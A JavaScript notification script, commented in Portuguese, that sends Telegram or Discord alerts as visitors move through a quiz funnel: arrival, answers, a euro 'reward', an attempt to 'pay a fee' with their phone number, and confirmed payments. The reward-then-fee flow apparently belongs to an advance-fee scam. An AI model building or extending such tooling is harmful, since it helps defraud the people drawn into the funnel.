/**
 * Sistema de Notificações para Celular
 * Envia alertas quando leads entram e interagem no funil
 */

// Configuração - Use config-telegram.html para configurar automaticamente
// Ou substitua manualmente os valores abaixo
const NOTIFICATION_CONFIG = {
  enabled: false, // Mude para true após configurar
  telegram: {
    botToken: '', // Token do bot do Telegram (obtido do @BotFather)
    chatId: '' // ID do chat (obtido via config-telegram.html)
  },
  // Alternativa: Discord Webhook
  discord: {
    webhookUrl: '' // URL do webhook do Discord (opcional)
  }
};

/**
 * Envia notificação via Telegram
 */
async function sendTelegramNotification(message) {
  if (!NOTIFICATION_CONFIG.enabled || !NOTIFICATION_CONFIG.telegram.botToken) {
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${NOTIFICATION_CONFIG.telegram.botToken}/sendMessage`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: NOTIFICATION_CONFIG.telegram.chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Erro ao enviar notificação Telegram');
    }
  } catch (error) {
    console.error('Erro ao enviar notificação:', error);
  }
}

/**
 * Envia notificação via Discord
 */
async function sendDiscordNotification(message) {
  if (!NOTIFICATION_CONFIG.enabled || !NOTIFICATION_CONFIG.discord.webhookUrl) {
    return;
  }

  try {
    const response = await fetch(NOTIFICATION_CONFIG.discord.webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: message
      })
    });

    if (!response.ok) {
      console.error('Erro ao enviar notificação Discord');
    }
  } catch (error) {
    console.error('Erro ao enviar notificação:', error);
  }
}

/**
 * Envia notificação (tenta Telegram primeiro, depois Discord)
 */
function sendNotification(message) {
  if (NOTIFICATION_CONFIG.telegram.botToken) {
    sendTelegramNotification(message);
  }
  if (NOTIFICATION_CONFIG.discord.webhookUrl) {
    sendDiscordNotification(message);
  }
}

/**
 * Notifica quando um lead entra no funil
 */
function notifyLeadEntered() {
  const userAgent = navigator.userAgent;
  const referrer = document.referrer || 'Direto';
  const timestamp = new Date().toLocaleString('pt-PT');
  
  const message = `
🚀 <b>Novo Lead no Funil!</b>

⏰ Hora: ${timestamp}
🌐 Origem: ${referrer}
📱 Dispositivo: ${getDeviceInfo()}
  `;
  
  sendNotification(message);
}

/**
 * Notifica quando lead responde uma pergunta
 */
function notifyQuestionAnswered(questionNumber, answer) {
  const timestamp = new Date().toLocaleString('pt-PT');
  
  const message = `
✅ <b>Lead Interagiu!</b>

📝 Pergunta ${questionNumber} respondida
💬 Resposta: ${answer}
⏰ Hora: ${timestamp}
  `;
  
  sendNotification(message);
}

/**
 * Notifica quando lead completa o quiz
 */
function notifyQuizCompleted(totalReward) {
  const timestamp = new Date().toLocaleString('pt-PT');
  
  const message = `
🎉 <b>Lead Completou o Quiz!</b>

💰 Recompensa: €${totalReward}
⏰ Hora: ${timestamp}
  `;
  
  sendNotification(message);
}

/**
 * Notifica quando lead clica em "Pagar Taxa"
 */
function notifyPaymentAttempted(method, phone = null) {
  const timestamp = new Date().toLocaleString('pt-PT');
  
  let message = `
💳 <b>Lead Tentou Pagar!</b>

💳 Método: ${method === 'mbway' ? 'MB Way' : 'Multibanco'}
⏰ Hora: ${timestamp}
  `;
  
  if (phone) {
    message += `\n📱 Telefone: +351${phone}`;
  }
  
  sendNotification(message);
}

/**
 * Notifica quando pagamento é confirmado
 */
function notifyPaymentConfirmed(amount, transactionId) {
  const timestamp = new Date().toLocaleString('pt-PT');
  
  const message = `
💰 <b>PAGAMENTO CONFIRMADO!</b>

💵 Valor: €${amount}
🆔 Transaction ID: ${transactionId}
⏰ Hora: ${timestamp}
  `;
  
  sendNotification(message);
}

/**
 * Obtém informações do dispositivo
 */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Desktop';
  
  if (/mobile|android|iphone|ipad/i.test(ua)) {
    device = 'Mobile';
  } else if (/tablet|ipad/i.test(ua)) {
    device = 'Tablet';
  }
  
  return device;
}

/**
 * Inicializa o sistema de notificações
 */
function initNotifications() {
  if (!NOTIFICATION_CONFIG.enabled) return;
  
  // Notificar quando página carregar
  if (document.readyState === 'complete') {
    notifyLeadEntered();
  } else {
    window.addEventListener('load', notifyLeadEntered);
  }
}

// Inicializar quando o script carregar
initNotifications();
